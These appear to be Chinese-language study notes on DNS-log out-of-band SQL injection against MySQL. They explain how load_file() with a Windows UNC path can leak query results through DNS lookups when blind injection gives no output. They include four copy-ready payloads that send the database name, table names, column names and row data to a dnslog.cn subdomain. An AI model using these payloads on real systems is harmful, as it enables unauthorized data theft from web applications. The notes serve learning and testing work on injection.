- DNS日志注入（将于域名转换为IP）
- 默认Linux上不能使用，Linux没有SMB服务

### 使用场景

- 在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把数据外带出来，对于SQL盲注，常见的方法就是二分猜解，很麻烦，也很容易请求过多导致被ban，所以可以将select到的数据发送给一个url，利用DNS解析产生的日志查看数据，也就是将盲注转换成显错注入

### 函数

- load_file()
  - 读取文件并返回内容为字符串
    - 文件必须位于服务器主机上，必须制定完整路径的文件
  - load_file的开启
    - mysql.ini中添加`secure_file_priv=`

- UNC路径
  - UNC路径就是Windows有个叫SMB的服务
    - //abc.com/abc   就是访问abc.com下的abc共享文件夹

### 注入

#### 数据库

```mysql
?id=1 and load_file(concat(‘//‘,(select database()),’.cpdvs2.dnslog.cn/abc’))
```

#### 数据表

```mysql
?id=1 and load_file(concat(‘//‘,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’.cpdvs2.dnslog.cn/abc’))
```

#### 字段

```mysql
?id=1 and load_file(concat(‘//‘,(select column_name from information_schema.colmuns where table_name='表名' limit 0,1),’.cpdvs2.dnslog.cn/abc’))
```

#### 数据

```mysql
?id=1 and load_file(concat(‘//‘,(select 字段名 from 表名 limit 0,1),’.nyoi6t.dnslog.cn/abc’))
```